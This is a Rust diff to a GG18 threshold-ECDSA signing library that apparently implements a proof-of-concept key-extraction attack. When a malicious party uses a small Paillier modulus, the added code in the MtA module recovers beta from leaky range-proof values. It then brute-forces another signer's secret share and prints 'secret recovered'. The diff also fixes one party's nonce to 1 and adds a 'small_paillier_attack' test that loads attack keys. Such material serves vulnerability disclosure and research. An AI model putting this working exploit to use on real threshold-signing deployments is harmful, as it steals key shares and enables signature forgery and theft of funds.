@@ -167,6 +167,7 @@ mod mta {
     use curv::elliptic::curves::traits::{ECPoint, ECScalar};
     use curv::{FE, GE};
     use std::collections::HashMap;
+    use std::ops::{Mul, Add};
 
     #[derive(Debug, Clone)]
     pub enum MtaAliceOutput {
@@ -230,8 +231,10 @@ mod mta {
 
         let alice_share = Paillier::decrypt(&alice_keys.dk, RawCiphertext::from(mta_output));
         let alice_share = alice_share.0.into_owned();
-        let alpha: FE = ECScalar::from(&alice_share);
+        let mut alpha: FE = ECScalar::from(&alice_share);
         let mut errors = Vec::new();
+        let g: GE = ECPoint::generator();
+        let n_mod_q: FE = ECScalar::from(&alice_keys.ek.n);
         match proof {
             // the simplified proof as defined in GG18, ch.5 , p.19
             BobProofType::DLogProofs(dlog_proofs) => {
@@ -258,8 +261,19 @@ mod mta {
                     )));
                 }
             }
+
             // Bob's range proof
             RangeProof(range_proof) => {
+                // If we're the malicious party, there can be either zero or one reductions modulo
+                // N. We can distinguish between the to options and recover the real alpha using
+                // the same t1 from ZK proof that is exploited to recover the secret
+                if alice_keys.ek.n < BigInt::from(2).pow(512) {
+                    let approx_beta = range_proof.t1.div_floor(&range_proof.e.0);
+                    let beta_fe: FE = ECScalar::from(&approx_beta);
+                    if alpha.to_big_int() < beta_fe.to_big_int() {
+                        alpha = alpha.add(&n_mod_q);
+                    }
+                }
                 if !range_proof.verify(a_enc, &mta_output, &alice_keys.ek, &alice_setup.unwrap()) {
                     errors.push(SigningError::BobProofFailed {
                         party: *party,
@@ -269,6 +283,38 @@ mod mta {
             }
             // Bob's range proof with proof of knowing b and beta_prim
             RangeProofExt(range_proof) => {
+                // If we're the malicious party, recover approximate value of beta from not-so-ZK proof
+                // and do an exhaustive search against public value of g^{w_i} to recover the exact value
+                if alice_keys.ek.n < BigInt::from(2).pow(512) {
+                    // real value of beta is very close to this number:
+                    let mut beta_candidate = range_proof.proof.t1.div_floor(&range_proof.proof.e.0).add(1);
+                    let mut verify_beta = |beta: &BigInt| -> Option<FE> {
+                        let beta_fe: FE = ECScalar::from(beta);
+                        let mut w_candidate = alpha.sub(&beta_fe.get_element());
+                        for j in 0..2 {
+                            if g.mul(w_candidate).eq(&range_proof.X) {
+                                if j > 0 {
+                                    let j_n_mod_q: FE = ECScalar::from(&alice_keys.ek.n.clone()
+                                        .mul(BigInt::from(j)));
+                                    alpha = alpha.add(&j_n_mod_q);
+                                }
+                                return Some(w_candidate);
+                            }
+                            w_candidate = w_candidate.add(&n_mod_q);
+                        }
+                        None
+                    };
+                    let real_w = loop {
+                        match verify_beta(&beta_candidate) {
+                            Some(w_) => { break w_; },
+                            None => {}
+                        }
+                        beta_candidate = beta_candidate.add(alice_keys.ek.n.clone() - 1)
+                            .modulus(&alice_keys.ek.n.clone());
+                    };
+                    assert_eq!(g*real_w, range_proof.X);
+                    println!("{}'s secret recovered." , party)
+                }
                 if !range_proof.verify(a_enc, &mta_output, &alice_keys.ek, &alice_setup.unwrap()) {
                     errors.push(SigningError::BobProofFailed {
                         party: *party,
@@ -312,7 +358,7 @@ mod phase5 {
     impl LocalSignature {
         /// Initializes the data with $` R, \space k_{i}, \space \sigma_{i} `$ .
         /// Sets (t,t) sharing of the desired signature to $` s_{i} = m k_{i} + r \sigma_{i} `$.
-        /// Chooses  $` \ell_{i}, \space \rho_{i}  \underset{R}{\in} Z_q `$     
+        /// Chooses  $` \ell_{i}, \space \rho_{i}  \underset{R}{\in} Z_q `$
         pub fn new(message_hash: &MessageHashType, R: &GE, k_i: &FE, sigma_i: &FE) -> Self {
             // H'(R) = Rx mod q
             let r: FE = ECScalar::from(&R.x_coor().unwrap().mod_floor(&FE::q()));
@@ -434,7 +480,7 @@ impl ErrorState {
     }
 }
 
-/// Checks whether all expected messages have been received so far from other parties  
+/// Checks whether all expected messages have been received so far from other parties
 fn is_broadcast_input_complete(
     current_msg_set: &[InMsg],
     other_parties: &BTreeSet<PartyIndex>,
@@ -567,7 +613,9 @@ impl Phase1 {
                 point: format!("{:?}", public_key),
             });
         }
-        let k_i = ECScalar::new_random();
+        let k_i = if multi_party_info.own_party_index != PartyIndex::from(0)
+        { ECScalar::new_random() }
+        else { ECScalar::from(&BigInt::from(1)) };
 
         let mta_a = if let Some(setups) = &multi_party_info.range_proof_setups {
             MtaAliceOutput::WithRangeProofs(
@@ -846,6 +894,7 @@ impl State<SigningTraits> for Phase2a {
                 &mta_a_message.c,
                 &self.multi_party_info.own_he_keys,
                 my_setup,
+
             ) {
                 Ok(alpha) => alpha_vec.push(alpha),
                 Err(ve) => errors.extend(ve),
@@ -1062,7 +1111,7 @@ impl State<SigningTraits> for Phase2b {
 /// Third phase of the protocol
 ///
 /// * Broadcasts  $` \delta_{i} `$
-/// * Reconstructs $` \delta = \sum_{i \in S} \delta_{i} = k \gamma `$, where $`S`$ is the signing quorum    
+/// * Reconstructs $` \delta = \sum_{i \in S} \delta_{i} = k \gamma `$, where $`S`$ is the signing quorum
 struct Phase3 {
     params: SigningParameters,
     multi_party_info: MultiPartyInfo,
@@ -1752,6 +1801,12 @@ mod tests {
         signing_helper(true)
     }
 
+    #[test]
+    fn small_paillier_attack() -> anyhow::Result<()> {
+        let _ = env_logger::builder().is_test(true).try_init();
+        signing_helper(true)
+    }
+
     fn signing_helper(enable_range_proofs: bool) -> anyhow::Result<()> {
         let mut nodes = Vec::new();
         let mut handles = Vec::new();
@@ -1762,9 +1817,7 @@ mod tests {
 
         // the valid output of keygen is stored in files keys{0,1,2}.json
         // hence the party n
-        let mut parties: Vec<usize> = vec![0, 1, 2];
-        // One party can be excluded because two remaining are sufficient to produce the signature
-        parties.remove(1);
+        let parties: Vec<usize> = vec![0, 1];
         let signing_parties: Vec<PartyIndex> = parties
             .iter()
             .map(|x| PartyIndex::from(*x))
@@ -1775,7 +1828,7 @@ mod tests {
             let (tx, egress) = crossbeam_channel::unbounded();
 
             let path = if enable_range_proofs {
-                format!("tests/data/zkrp-keys.{}.json", i)
+                format!("tests/data/attack_keys.{}.json", i)
             } else {
                 format!("tests/data/keys.{}.json", i)
             };
@@ -1882,6 +1935,7 @@ mod tests {
             });
             assert!(false, "Some state machines returned error");
         }
+        println!("Signature successful");
 
         // safe to assume here that results contain FinalState only, no errors
         let _final_states = results
